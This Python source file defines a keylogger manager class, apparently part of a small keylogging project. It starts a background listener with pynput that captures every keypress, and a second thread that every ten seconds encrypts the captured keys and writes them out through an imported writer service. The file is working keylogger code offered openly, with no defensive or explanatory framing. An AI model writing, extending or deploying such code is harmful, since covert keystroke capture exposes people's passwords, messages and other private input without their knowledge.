from service import KeyLoggerService,FileWriter,Encryptor
from Interface import IKeyLoggerManager
from pynput.keyboard import Listener
import threading,time

class KeyLoggerManager(IKeyLoggerManager):
    def __init__(self):
        self.__key_logger = KeyLoggerService()
        self.__writer = FileWriter()
        self.__encryptor = Encryptor()
        self.__is_logging = False
        self.__logger_thread = threading.Thread(target=self.__listen)
        self.__send_data_thread = threading.Thread(target=self.__send_data)


    def start_logging(self):
        self.__is_logging = True
        self.__logger_thread.start()
        self.__send_data_thread.start()

    def stop_logging(self):
        self.__is_logging = False
        if hasattr(self, 'listener'):
            self.listener.stop()

    def __listen(self):
        with Listener(on_press=self.__key_logger.on_press) as self.listener:
            self.listener.join()

    def __send_data(self):
        while self.__is_logging:
            data = self.__key_logger.get_logged_keys()
            encrypt_data = {self.__encryptor.encrypt(key):self.__encryptor.encrypt(value) for key,value in data.items()}
            self.__writer.write(encrypt_data)
            time.sleep(10)

    def print_keys(self):
        logged_keys = self.__key_logger.get_logged_keys()
        self.__key_logger.clear_logged_keys()
        for key, value in logged_keys.items():
            print(key)
            print(value)
